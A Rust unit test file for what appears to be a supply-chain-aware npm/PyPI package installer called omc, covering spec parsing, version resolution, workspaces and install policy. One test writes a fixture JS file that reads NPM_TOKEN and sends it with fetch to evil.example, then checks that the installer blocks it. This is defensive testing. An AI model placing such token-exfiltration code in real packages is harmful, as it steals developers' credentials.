//! `tests` unit tests — extracted verbatim from lib.rs.

use super::*;

/// Serializes the (process-global) `OMC_HOME` env var across every test that
/// mutates it, since cargo runs tests in parallel threads.
static OMC_HOME_ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

fn has_spec(specs: &[PackageSpec], name: &str, requirement: &str) -> bool {
    specs
        .iter()
        .any(|spec| spec.name == name && spec.version.as_deref() == Some(requirement))
}

fn test_pypi_file(filename: &str, packagetype: &str) -> PypiFile {
    PypiFile {
        filename: filename.to_owned(),
        packagetype: packagetype.to_owned(),
        url: format!("https://example.invalid/{filename}"),
        digests: PypiDigests {
            sha256: "abc".to_owned(),
        },
        requires_python: None,
    }
}

fn commit_git_repo(path: &Path) {
    assert!(Command::new("git")
        .arg("init")
        .arg("--quiet")
        .arg(path)
        .status()
        .unwrap()
        .success());
    assert!(Command::new("git")
        .arg("-C")
        .arg(path)
        .arg("add")
        .arg(".")
        .status()
        .unwrap()
        .success());
    assert!(Command::new("git")
        .arg("-C")
        .arg(path)
        .arg("-c")
        .arg("user.email=omc@example.invalid")
        .arg("-c")
        .arg("user.name=omc test")
        .arg("commit")
        .arg("--quiet")
        .arg("-m")
        .arg("initial")
        .status()
        .unwrap()
        .success());
}

fn with_env_lock<T>(f: impl FnOnce() -> T) -> T {
    static ENV_MUTEX: std::sync::OnceLock<std::sync::Mutex<()>> = std::sync::OnceLock::new();
    let _guard = ENV_MUTEX
        .get_or_init(|| std::sync::Mutex::new(()))
        .lock()
        .unwrap();
    f()
}

fn with_env_values<T>(values: &[(&str, Option<&str>)], f: impl FnOnce() -> T) -> T {
    with_env_lock(|| {
        let old_values = values
            .iter()
            .map(|(key, _)| (*key, env::var_os(key)))
            .collect::<Vec<_>>();
        for (key, value) in values {
            if let Some(value) = value {
                env::set_var(key, value);
            } else {
                env::remove_var(key);
            }
        }
        let result = f();
        for (key, old) in old_values {
            if let Some(old) = old {
                env::set_var(key, old);
            } else {
                env::remove_var(key);
            }
        }
        result
    })
}

#[test]
fn parses_npm_specs() {
    let spec = PackageSpec::parse("npm:left-pad@1.3.0").unwrap();
    assert_eq!(spec.ecosystem, Ecosystem::Npm);
    assert_eq!(spec.name, "left-pad");
    assert_eq!(spec.version.as_deref(), Some("1.3.0"));

    let spec = PackageSpec::parse("npm:@scope/pkg@2.0.0").unwrap();
    assert_eq!(spec.name, "@scope/pkg");
    assert_eq!(spec.version.as_deref(), Some("2.0.0"));
}

#[test]
fn parses_pypi_specs() {
    let spec = PackageSpec::parse("pypi:requests==2.32.3").unwrap();
    assert_eq!(spec.ecosystem, Ecosystem::Pypi);
    assert_eq!(spec.name, "requests");
    assert_eq!(spec.version.as_deref(), Some("2.32.3"));
    assert!(spec.extras.is_empty());

    let spec = PackageSpec::parse("pypi:six@1.16.0").unwrap();
    assert_eq!(spec.name, "six");
    assert_eq!(spec.version.as_deref(), Some("1.16.0"));

    let spec = PackageSpec::parse("pypi:urllib3<3,>=1.21.1").unwrap();
    assert_eq!(spec.name, "urllib3");
    assert_eq!(spec.version.as_deref(), Some("<3,>=1.21.1"));

    let spec = PackageSpec::parse("pypi:requests[socks,security]==2.32.3").unwrap();
    assert_eq!(spec.name, "requests");
    assert_eq!(spec.version.as_deref(), Some("2.32.3"));
    assert_eq!(
        spec.extras,
        BTreeSet::from(["security".to_owned(), "socks".to_owned()])
    );
    assert_eq!(spec.package_key(), "pypi:requests[security,socks]");

    let spec = PackageSpec::parse(
            "pypi:idna @ https://example.invalid/idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        )
        .unwrap();
    assert_eq!(spec.name, "idna");
    assert_eq!(
        spec.direct_url.as_deref(),
        Some("https://example.invalid/idna-3.7-py3-none-any.whl")
    );
}

#[test]
fn resolves_common_npm_ranges() {
    assert!(npm_version_satisfies("6.0.0", "^6.0.0"));
    assert!(npm_version_satisfies("6.1.2", "^6.0.0"));
    assert!(!npm_version_satisfies("7.0.0", "^6.0.0"));
    assert!(npm_version_satisfies("1.2.9", "~1.2.0"));
    assert!(!npm_version_satisfies("1.3.0", "~1.2.0"));
    assert!(npm_version_satisfies("1.1.3", "^1.1.0,1.1.3"));
    assert!(!npm_version_satisfies("1.3.0", "^1.1.0,1.1.3"));
}

#[test]
fn resolves_npm_dist_tag_requirements() {
    let root: NpmRoot = serde_json::from_value(serde_json::json!({
        "dist-tags": {
            "latest": "2.0.0",
            "beta": "3.0.0-beta.1"
        },
        "time": {},
        "versions": {}
    }))
    .unwrap();

    assert_eq!(
        choose_npm_version("demo", "latest", &root, None).unwrap(),
        "2.0.0"
    );
    assert_eq!(
        choose_npm_version("demo", "beta", &root, None).unwrap(),
        "3.0.0-beta.1"
    );
}

#[test]
fn resolves_npm_versions_before_publish_time() {
    let root: NpmRoot = serde_json::from_value(serde_json::json!({
            "dist-tags": {
                "latest": "2.0.0",
                "beta": "3.0.0-beta.1"
            },
            "time": {
                "1.0.0": "2023-01-01T00:00:00.000Z",
                "1.1.0": "2023-06-01T00:00:00.000Z",
                "2.0.0": "2024-01-01T00:00:00.000Z",
                "3.0.0-beta.1": "2024-02-01T00:00:00.000Z"
            },
            "versions": {
                "1.0.0": {
                    "version": "1.0.0",
                    "dist": { "tarball": "https://registry.example.invalid/demo/-/demo-1.0.0.tgz" }
                },
                "1.1.0": {
                    "version": "1.1.0",
                    "dist": { "tarball": "https://registry.example.invalid/demo/-/demo-1.1.0.tgz" }
                },
                "2.0.0": {
                    "version": "2.0.0",
                    "dist": { "tarball": "https://registry.example.invalid/demo/-/demo-2.0.0.tgz" }
                },
                "3.0.0-beta.1": {
                    "version": "3.0.0-beta.1",
                    "dist": { "tarball": "https://registry.example.invalid/demo/-/demo-3.0.0-beta.1.tgz" }
                }
            }
        }))
        .unwrap();

    assert_eq!(
        choose_npm_version("demo", "latest", &root, Some("2023-12-31T23:59:59Z")).unwrap(),
        "1.1.0"
    );
    assert_eq!(
        choose_npm_version("demo", "^1.0.0", &root, Some("2023-02-01")).unwrap(),
        "1.0.0"
    );
    assert!(choose_npm_version("demo", "2.0.0", &root, Some("2023-12-31T23:59:59Z")).is_err());
}

#[test]
fn parses_min_release_age_durations() {
    assert_eq!(parse_min_release_age(None).unwrap(), None);
    assert_eq!(
        parse_min_release_age(Some("14d")).unwrap(),
        Some(14 * 86_400)
    );
    assert_eq!(
        parse_min_release_age(Some("12h")).unwrap(),
        Some(12 * 3_600)
    );
    assert_eq!(parse_min_release_age(Some("0")).unwrap(), Some(0));
    // A malformed value fails closed (never silently disables the floor).
    assert!(parse_min_release_age(Some("soon")).is_err());
}

#[test]
fn effective_min_age_layers_dsl_over_project() {
    let dir = tempfile::tempdir().unwrap();
    let mut options = LinkOptions::new(dir.path());
    // Project/global floor of 14 days.
    options.min_release_age_secs = Some(14 * 86_400);
    // No DSL => the project floor applies to any package.
    assert_eq!(
        effective_min_age_secs(&options, Ecosystem::Npm, "left-pad"),
        Some(14 * 86_400)
    );
    // A DSL with a per-package override layers on top: `trusted` is exempted
    // (explicit 0 => no requirement), `slow` is tightened to 30d.
    options.policy_document = Some(
        omc_policy::parse(
            r#"
                package "trusted" { min-age "0" }
                package "slow" { min-age "30d" }
            "#,
        )
        .unwrap(),
    );
    assert_eq!(
        effective_min_age_secs(&options, Ecosystem::Npm, "left-pad"),
        Some(14 * 86_400) // unmatched => project floor
    );
    assert_eq!(
        effective_min_age_secs(&options, Ecosystem::Npm, "trusted"),
        None
    ); // exempted
    assert_eq!(
        effective_min_age_secs(&options, Ecosystem::Npm, "slow"),
        Some(30 * 86_400)
    );
}

#[test]
fn effective_npm_before_combines_age_and_explicit() {
    let dir = tempfile::tempdir().unwrap();
    let mut options = LinkOptions::new(dir.path());
    // No cutoff at all.
    assert_eq!(effective_npm_before(&options, "x").unwrap(), None);

    // A 7-day min-age yields a cutoff ~7 days ago.
    options.min_release_age_secs = Some(7 * 86_400);
    let before = effective_npm_before(&options, "x").unwrap().unwrap();
    let parsed = parse_npm_before(&before).unwrap();
    let expected = Utc::now() - Duration::days(7);
    assert!(
        (parsed - expected).num_seconds().abs() < 120,
        "got {before}"
    );

    // An explicit far-past --before is more restrictive and wins.
    options.npm_before = Some("2020-01-01T00:00:00Z".to_owned());
    let before = effective_npm_before(&options, "x").unwrap().unwrap();
    let parsed = parse_npm_before(&before).unwrap();
    assert_eq!(parsed.format("%Y").to_string(), "2020");
}

#[test]
fn parses_npm_alias_requirements() {
    let spec = PackageSpec::parse("npm:string-width-cjs@npm:string-width@^4.2.0").unwrap();
    assert_eq!(spec.name, "string-width-cjs");
    assert_eq!(spec.version.as_deref(), Some("npm:string-width@^4.2.0"));
    let (registry_name, requirement) = npm_registry_name_and_requirement(&spec).unwrap();
    assert_eq!(registry_name, "string-width");
    assert_eq!(requirement.as_deref(), Some("^4.2.0"));

    let scoped = PackageSpec::parse("npm:@demo/runtime@npm:@scope/runtime@^1.0.0").unwrap();
    assert_eq!(scoped.name, "@demo/runtime");
    assert_eq!(scoped.version.as_deref(), Some("npm:@scope/runtime@^1.0.0"));
    let (registry_name, requirement) = npm_registry_name_and_requirement(&scoped).unwrap();
    assert_eq!(registry_name, "@scope/runtime");
    assert_eq!(requirement.as_deref(), Some("^1.0.0"));
}

#[test]
fn parses_npm_direct_tarball_specs() {
    let spec =
        PackageSpec::parse("npm:local-pkg @ https://example.invalid/local-pkg-1.0.0.tgz").unwrap();
    assert_eq!(spec.name, "local-pkg");
    assert_eq!(
        spec.direct_url.as_deref(),
        Some("https://example.invalid/local-pkg-1.0.0.tgz")
    );
}

#[test]
fn parses_npm_github_dependencies_as_direct_archives() {
    let spec = PackageSpec::parse("npm:github-pkg @ github:turenio/omc#main").unwrap();
    assert_eq!(spec.name, "github-pkg");
    assert_eq!(
        spec.direct_url.as_deref(),
        Some("https://github.com/turenio/omc/archive/main.tar.gz")
    );

    let spec = PackageSpec::parse(
        "npm:github-pkg @ git+ssh://git@github.com/turenio/omc.git#refs/tags/v1.0.0",
    )
    .unwrap();
    assert_eq!(
        spec.direct_url.as_deref(),
        Some("https://github.com/turenio/omc/archive/refs/tags/v1.0.0.tar.gz")
    );

    let spec = parse_npm_direct_archive_reference(
        "git+https://github.com/turenio/omc.git#v1.0.0",
        Path::new("."),
    )
    .unwrap()
    .unwrap();
    assert_eq!(spec.name, NPM_DIRECT_TARBALL_PLACEHOLDER);
    assert_eq!(
        spec.direct_url.as_deref(),
        Some("https://github.com/turenio/omc/archive/v1.0.0.tar.gz")
    );

    let direct_archive = parse_npm_direct_archive_reference(
        "https://github.com/turenio/omc/archive/main.tar.gz",
        Path::new("."),
    )
    .unwrap()
    .unwrap();
    assert_eq!(
        direct_archive.direct_url.as_deref(),
        Some("https://github.com/turenio/omc/archive/main.tar.gz")
    );

    let error =
        PackageSpec::parse("npm:github-pkg @ github:turenio/omc#semver:^1.0.0").unwrap_err();
    assert!(error.to_string().contains("uses semver refs"));
}

#[test]
fn npm_direct_specs_prefer_locked_github_resolved_url() {
    let dir = tempfile::tempdir().unwrap();
    let mut options = LinkOptions::new(dir.path());
    options.npm_resolved.insert(
        "npm:github-pkg".to_owned(),
        "git+https://github.com/turenio/omc.git#v1.0.0".to_owned(),
    );
    let spec = PackageSpec::parse("npm:github-pkg @ github:turenio/omc#main").unwrap();

    let source_url = locked_npm_direct_url_for_spec(&spec, &options)
        .unwrap()
        .unwrap();

    assert_eq!(
        source_url,
        "https://github.com/turenio/omc/archive/v1.0.0.tar.gz"
    );
}

#[test]
fn npm_lockfile_resolution_converts_github_resolved_url() {
    let dir = tempfile::tempdir().unwrap();
    let mut options = LinkOptions::new(dir.path());
    options
        .constraints
        .insert("npm:github-pkg".to_owned(), "1.2.3".to_owned());
    options.npm_resolved.insert(
        "npm:github-pkg".to_owned(),
        "git+ssh://git@github.com/turenio/omc.git#v1.2.3".to_owned(),
    );
    let spec = PackageSpec::parse("npm:github-pkg@^1.0.0").unwrap();

    let resolved = resolve_npm_lockfile_tarball(&spec, "github-pkg", Some("^1.0.0"), &options)
        .unwrap()
        .unwrap();

    assert_eq!(
        resolved.source_url,
        "https://github.com/turenio/omc/archive/v1.2.3.tar.gz"
    );
    assert!(resolved.npm_direct_tarball);
}

#[test]
fn ignores_common_archive_metadata_paths() {
    assert!(is_ignorable_archive_metadata_path("pax_global_header"));
    assert!(is_ignorable_archive_metadata_path(
        "package/__MACOSX/._metadata"
    ));
    assert!(is_ignorable_archive_metadata_path("package/._index.js"));
    assert!(!is_ignorable_archive_metadata_path("package/index.js"));
}

#[test]
fn reads_package_json_github_dependencies_as_direct_archives() {
    let dir = tempfile::tempdir().unwrap();
    let package_json = dir.path().join("package.json");
    fs::write(
        &package_json,
        r#"{
                "name": "github-demo",
                "dependencies": {
                    "github-pkg": "github:turenio/omc#main",
                    "bare-github": "turenio/omc#v1.0.0"
                }
            }"#,
    )
    .unwrap();

    let specs = read_package_json_specs(&package_json, false).unwrap();

    assert!(specs.iter().any(|spec| spec.name == "github-pkg"
        && spec.direct_url.as_deref()
            == Some("https://github.com/turenio/omc/archive/main.tar.gz")));
    assert!(specs.iter().any(|spec| spec.name == "bare-github"
        && spec.direct_url.as_deref()
            == Some("https://github.com/turenio/omc/archive/v1.0.0.tar.gz")));
}

#[test]
fn parses_npm_direct_local_tarball_reference() {
    let dir = tempfile::tempdir().unwrap();
    let archive = dir.path().join("local-pkg-1.0.0.tgz");
    fs::write(
        &archive,
        npm_tgz_for_test(r#"{ "name": "local-pkg", "version": "1.0.0" }"#),
    )
    .unwrap();

    let spec = parse_npm_direct_archive_reference("./local-pkg-1.0.0.tgz", dir.path())
        .unwrap()
        .unwrap();

    assert_eq!(spec.name, "local-pkg");
    assert_eq!(spec.ecosystem, Ecosystem::Npm);
    assert!(spec.direct_url.as_deref().unwrap().starts_with("file://"));
    assert!(spec
        .direct_url
        .as_deref()
        .unwrap()
        .ends_with("/local-pkg-1.0.0.tgz"));
}

#[test]
fn writes_direct_url_manifest_dependencies() {
    let dir = tempfile::tempdir().unwrap();
    let archive = dir.path().join("local-pkg-1.0.0.tgz");
    fs::write(
        &archive,
        npm_tgz_for_test(r#"{ "name": "local-pkg", "version": "1.0.0" }"#),
    )
    .unwrap();
    let spec = parse_npm_direct_archive_reference("./local-pkg-1.0.0.tgz", dir.path())
        .unwrap()
        .unwrap();

    add_package_graph(&spec, &LinkOptions::new(dir.path())).unwrap();

    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
    let requirement = manifest.dependencies.get("npm:local-pkg").unwrap();
    assert!(requirement.starts_with("file://"));
    assert!(parse_manifest_dependency("npm:local-pkg", requirement)
        .unwrap()
        .direct_url
        .is_some());
}

#[test]
fn skips_manifest_write_when_save_is_disabled() {
    let dir = tempfile::tempdir().unwrap();
    let archive = dir.path().join("transient-pkg-1.0.0.tgz");
    fs::write(
        &archive,
        npm_tgz_for_test(r#"{ "name": "transient-pkg", "version": "1.0.0" }"#),
    )
    .unwrap();
    let spec = parse_npm_direct_archive_reference("./transient-pkg-1.0.0.tgz", dir.path())
        .unwrap()
        .unwrap();

    let mut options = LinkOptions::new(dir.path());
    options.save_manifest_dependency = false;
    add_package_graph(&spec, &options).unwrap();

    let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
    assert!(manifest.dependencies.is_empty());
    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert!(lock
        .packages
        .iter()
        .any(|package| package.name == "transient-pkg"));
}

#[test]
fn reads_project_package_json_specs() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("vendor/local-dir")).unwrap();
    fs::create_dir_all(dir.path().join("vendor/linked-pkg")).unwrap();
    let package_json = dir.path().join("package.json");
    fs::write(
        &package_json,
        r#"{
                "scripts": { "check": "node -e \"console.log('ok')\"" },
                "dependencies": {
                    "is-odd": "3.0.1",
                    "local-dir": "file:vendor/local-dir",
                    "linked-pkg": "link:vendor/linked-pkg"
                },
                "devDependencies": { "which": "^2.0.2" },
                "optionalDependencies": {
                    "is-even": "1.0.0",
                    "local-pkg": "file:vendor/local-pkg-1.0.0.tgz",
                    "remote-pkg": "https://example.invalid/remote-pkg-2.0.0.tgz",
                    "workspace-pkg": "workspace:*"
                },
                "peerDependencies": {
                    "left-pad": "1.3.0",
                    "optional-peer": "1.0.0"
                },
                "peerDependenciesMeta": {
                    "optional-peer": { "optional": true }
                }
            }"#,
    )
    .unwrap();
    let specs = read_package_json_specs(&package_json, true).unwrap();
    assert!(specs
        .iter()
        .any(|spec| spec.name == "is-odd" && spec.version.as_deref() == Some("3.0.1")));
    assert!(specs
        .iter()
        .any(|spec| spec.name == "which" && spec.version.as_deref() == Some("^2.0.2")));
    assert!(specs
        .iter()
        .any(|spec| spec.name == "is-even" && spec.version.as_deref() == Some("1.0.0")));
    assert!(specs
        .iter()
        .any(|spec| spec.name == "left-pad" && spec.version.as_deref() == Some("1.3.0")));
    assert!(!specs.iter().any(|spec| spec.name == "optional-peer"));
    let local_pkg = specs.iter().find(|spec| spec.name == "local-pkg").unwrap();
    assert!(local_pkg
        .direct_url
        .as_deref()
        .unwrap()
        .starts_with("file://"));
    assert!(local_pkg
        .direct_url
        .as_deref()
        .unwrap()
        .ends_with("/vendor/local-pkg-1.0.0.tgz"));
    assert!(specs.iter().any(|spec| spec.name == "remote-pkg"
        && spec.direct_url.as_deref() == Some("https://example.invalid/remote-pkg-2.0.0.tgz")));
    assert!(!specs.iter().any(|spec| spec.name == "workspace-pkg"));
    assert!(!specs.iter().any(|spec| spec.name == "local-dir"));
    assert!(!specs.iter().any(|spec| spec.name == "linked-pkg"));

    let scripts = read_package_scripts(dir.path()).unwrap();
    assert_eq!(
        scripts.get("check").map(String::as_str),
        Some("node -e \"console.log('ok')\"")
    );

    let production_specs = read_package_json_specs(&package_json, false).unwrap();
    assert!(production_specs
        .iter()
        .any(|spec| spec.name == "is-odd" && spec.version.as_deref() == Some("3.0.1")));
    assert!(!production_specs.iter().any(|spec| spec.name == "which"));
}

#[test]
fn reads_pipfile_scripts_and_package_json_overrides() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("Pipfile"),
        r#"
            [packages]
            idna = "==3.7"

            [scripts]
            test = "pytest"
            lint = "ruff check ."
            "#,
    )
    .unwrap();

    let scripts = read_package_scripts(dir.path()).unwrap();
    assert_eq!(scripts.get("test").map(String::as_str), Some("pytest"));
    assert_eq!(
        scripts.get("lint").map(String::as_str),
        Some("ruff check .")
    );

    fs::write(
        dir.path().join("package.json"),
        r#"{
                "scripts": {
                    "test": "node test.js",
                    "build": "node build.js"
                }
            }"#,
    )
    .unwrap();

    let scripts = read_package_scripts(dir.path()).unwrap();
    assert_eq!(
        scripts.get("test").map(String::as_str),
        Some("node test.js")
    );
    assert_eq!(
        scripts.get("lint").map(String::as_str),
        Some("ruff check .")
    );
    assert_eq!(
        scripts.get("build").map(String::as_str),
        Some("node build.js")
    );
}

#[test]
fn rejects_unsupported_npm_file_dependencies() {
    let dir = tempfile::tempdir().unwrap();
    let package_json = dir.path().join("package.json");
    fs::write(
        &package_json,
        r#"{ "dependencies": { "local-pkg": "file:../local-pkg" } }"#,
    )
    .unwrap();

    let error = read_package_json_specs(&package_json, true).unwrap_err();
    assert!(error
        .to_string()
        .contains("must be a .tgz/.tar.gz tarball or an existing directory"));
}

#[test]
fn reads_package_json_overrides_and_resolutions_as_overrides() {
    let dir = tempfile::tempdir().unwrap();
    let package_json = dir.path().join("package.json");
    fs::write(
        &package_json,
        r#"{
                "dependencies": { "left-pad": "^1.0.0" },
                "overrides": {
                    "left-pad": "1.3.0",
                    "@scope/pkg@^2.0.0": { ".": "2.1.0", "transitive": "3.0.0" },
                    "ignored": "file:../ignored"
                },
                "resolutions": {
                    "**/ansi-regex": "5.0.1",
                    "@demo/tool": "4.0.0"
                }
            }"#,
    )
    .unwrap();

    let requirements =
        read_package_json_requirements(&package_json, DependencySelection::with_dev(true)).unwrap();
    assert_eq!(
        requirements
            .npm_overrides
            .get("npm:left-pad")
            .map(String::as_str),
        Some("1.3.0")
    );
    assert_eq!(
        requirements
            .npm_overrides
            .get("npm:@scope/pkg")
            .map(String::as_str),
        Some("2.1.0")
    );
    assert_eq!(
        requirements
            .npm_overrides
            .get("npm:transitive")
            .map(String::as_str),
        Some("3.0.0")
    );
    assert_eq!(
        requirements
            .npm_overrides
            .get("npm:ansi-regex")
            .map(String::as_str),
        Some("5.0.1")
    );
    assert_eq!(
        requirements
            .npm_overrides
            .get("npm:@demo/tool")
            .map(String::as_str),
        Some("4.0.0")
    );
    assert!(!requirements.npm_overrides.contains_key("npm:ignored"));
    assert!(requirements.constraints.is_empty());
}

#[test]
fn reads_workspace_package_json_specs() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("packages/api")).unwrap();
    fs::create_dir_all(dir.path().join("packages/ignored")).unwrap();
    fs::create_dir_all(dir.path().join("node_modules/nope")).unwrap();

    let package_json = dir.path().join("package.json");
    fs::write(
        &package_json,
        r#"{
                "name": "workspace-root",
                "workspaces": ["packages/*", "!packages/ignored"],
                "dependencies": { "root-dep": "1.0.0" },
                "devDependencies": { "root-dev": "2.0.0" }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("packages/api/package.json"),
        r#"{
                "name": "api",
                "dependencies": { "workspace-dep": "3.0.0" },
                "devDependencies": { "workspace-dev": "4.0.0" }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("packages/ignored/package.json"),
        r#"{ "dependencies": { "ignored-dep": "5.0.0" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("node_modules/nope/package.json"),
        r#"{ "dependencies": { "node-modules-dep": "6.0.0" } }"#,
    )
    .unwrap();

    let specs = read_package_json_specs(&package_json, true).unwrap();
    assert!(has_spec(&specs, "root-dep", "1.0.0"));
    assert!(has_spec(&specs, "root-dev", "2.0.0"));
    assert!(has_spec(&specs, "workspace-dep", "3.0.0"));
    assert!(has_spec(&specs, "workspace-dev", "4.0.0"));
    assert!(!specs.iter().any(|spec| spec.name == "ignored-dep"));
    assert!(!specs.iter().any(|spec| spec.name == "node-modules-dep"));

    let production_specs = read_package_json_specs(&package_json, false).unwrap();
    assert!(has_spec(&production_specs, "root-dep", "1.0.0"));
    assert!(has_spec(&production_specs, "workspace-dep", "3.0.0"));
    assert!(!production_specs.iter().any(|spec| spec.name == "root-dev"));
    assert!(!production_specs
        .iter()
        .any(|spec| spec.name == "workspace-dev"));
}

#[test]
fn installs_npm_workspace_links() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("packages/lib")).unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{
                "name": "workspace-root",
                "workspaces": ["packages/*"],
                "dependencies": { "@demo/lib": "workspace:*" }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("packages/lib/package.json"),
        r#"{ "name": "@demo/lib", "main": "index.js", "bin": { "demo-lib": "cli.js" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("packages/lib/index.js"),
        "module.exports = 41;\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("packages/lib/cli.js"),
        "#!/usr/bin/env node\n",
    )
    .unwrap();

    let report = install_project(&LinkOptions::new(dir.path())).unwrap();
    assert_eq!(report.npm_packages, 0);
    assert_eq!(report.npm_bins, 1);
    assert_eq!(
        fs::read_to_string(dir.path().join("node_modules/@demo/lib/index.js")).unwrap(),
        "module.exports = 41;\n"
    );
    assert!(dir.path().join("node_modules/.bin/demo-lib").exists());
}

#[test]
fn installs_npm_root_package_bins() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{
                "name": "@demo/root",
                "bin": { "root-tool": "cli.js" }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("cli.js"),
        "#!/usr/bin/env node\nconsole.log('root-tool-ok')\n",
    )
    .unwrap();

    let report = install_project(&LinkOptions::new(dir.path())).unwrap();
    assert_eq!(report.npm_packages, 0);
    assert_eq!(report.npm_bins, 1);

    let output = Command::new(dir.path().join("node_modules/.bin/root-tool"))
        .output()
        .unwrap();
    assert!(output.status.success());
    assert_eq!(
        String::from_utf8_lossy(&output.stdout).trim(),
        "root-tool-ok"
    );
}

#[test]
fn installs_npm_local_directory_links_respecting_omit_dev() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("vendor/local-pkg")).unwrap();
    fs::create_dir_all(dir.path().join("vendor/dev-pkg")).unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{
                "name": "local-link-root",
                "dependencies": { "local-pkg": "file:vendor/local-pkg" },
                "devDependencies": { "dev-pkg": "link:vendor/dev-pkg" }
            }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/local-pkg/index.js"),
        "module.exports = 41;\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/local-pkg/package.json"),
        r#"{ "name": "local-pkg", "bin": { "local-tool": "cli.js" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/local-pkg/cli.js"),
        "#!/usr/bin/env node\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/dev-pkg/index.js"),
        "module.exports = 42;\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/dev-pkg/package.json"),
        r#"{ "name": "dev-pkg", "bin": { "dev-tool": "cli.js" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/dev-pkg/cli.js"),
        "#!/usr/bin/env node\n",
    )
    .unwrap();

    let mut options = LinkOptions::new(dir.path());
    options.include_dev_dependencies = false;
    let report = install_project(&options).unwrap();
    assert_eq!(report.npm_bins, 1);
    assert_eq!(
        fs::read_to_string(dir.path().join("node_modules/local-pkg/index.js")).unwrap(),
        "module.exports = 41;\n"
    );
    assert!(dir.path().join("node_modules/.bin/local-tool").exists());
    assert!(!dir.path().join("node_modules/.bin/dev-tool").exists());
    assert!(!dir.path().join("node_modules/dev-pkg").exists());

    options.include_dev_dependencies = true;
    let report = install_project(&options).unwrap();
    assert_eq!(report.npm_bins, 2);
    assert_eq!(
        fs::read_to_string(dir.path().join("node_modules/dev-pkg/index.js")).unwrap(),
        "module.exports = 42;\n"
    );
    assert!(dir.path().join("node_modules/.bin/dev-tool").exists());
}

#[test]
fn install_project_compiles_npm_local_source_artifacts_before_linking() {
    let dir = tempfile::tempdir().unwrap();
    let local = dir.path().join("vendor/local-pkg");
    fs::create_dir_all(&local).unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{
                "name": "local-source-root",
                "dependencies": { "local-pkg": "file:vendor/local-pkg" }
            }"#,
    )
    .unwrap();
    fs::write(
        local.join("package.json"),
        r#"{ "name": "local-pkg", "version": "1.2.3" }"#,
    )
    .unwrap();
    fs::write(
            local.join("index.js"),
            "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/upload', { body: token });\n",
        )
        .unwrap();

    let error = install_project(&LinkOptions::new(dir.path())).unwrap_err();
    assert!(error
        .to_string()
        .contains("blocked package `npm:local-pkg@1.2.3 local source"));
    assert!(!dir.path().join("node_modules/local-pkg").exists());

    let mut options = LinkOptions::new(dir.path());
    options.allowed_capabilities = vec![
        Capability::EnvRead("NPM_TOKEN".to_owned()),
        Capability::HttpHost("evil.example".to_owned()),
    ];
    options
        .allowed_flows
        .push(parse_flow_rule("env:NPM_TOKEN->network:evil.example").unwrap());
    let report = install_project(&options).unwrap();

    assert_eq!(report.local_source_artifacts, 1);
    assert!(dir.path().join("node_modules/local-pkg").exists());
    let artifact_path = dir
        .path()
        .join(".omc/artifacts/npm/local-pkg/1.2.3/omc.json");
    let artifact: OmcArtifact =
        serde_json::from_str(&fs::read_to_string(&artifact_path).unwrap()).unwrap();
    verify_artifact_signature(&artifact).unwrap();
    assert_eq!(artifact.package.name, "local-pkg");
    assert_eq!(artifact.package.version, "1.2.3");
    assert_eq!(artifact.verdict, Verdict::Accepted);
    assert!(artifact.capabilities.iter().any(|finding| {
        finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"
    }));
    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert_eq!(lock.local_sources.len(), 1);
    assert_eq!(lock.local_sources[0].name, "local-pkg");
    assert_eq!(lock.local_sources[0].version, "1.2.3");
    assert_eq!(lock.local_sources[0].sha256, artifact.source_sha256);

    let locked_artifact_json = fs::read_to_string(&artifact_path).unwrap();
    install_locked_project(&options).unwrap();
    assert_eq!(
        fs::read_to_string(&artifact_path).unwrap(),
        locked_artifact_json
    );
    fs::write(
            local.join("index.js"),
            "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/changed', { body: token });\n",
        )
        .unwrap();
    let error = install_locked_project(&options).unwrap_err();
    assert!(error
        .to_string()
        .contains("omc.lock does not satisfy `npm:local-pkg local source"));
    assert_eq!(
        fs::read_to_string(&artifact_path).unwrap(),
        locked_artifact_json
    );
}

#[test]
fn installs_manifest_npm_local_paths() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("vendor/direct-pkg")).unwrap();
    fs::write(
        dir.path().join("vendor/direct-pkg/index.js"),
        "module.exports = 43;\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/direct-pkg/package.json"),
        r#"{ "name": "direct-pkg", "bin": { "direct-tool": "cli.js" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("vendor/direct-pkg/cli.js"),
        "#!/usr/bin/env node\n",
    )
    .unwrap();

    add_manifest_npm_local_paths(
        dir.path(),
        &[PathBuf::from("vendor/direct-pkg")],
        ManifestDependencyKind::Production,
    )
    .unwrap();
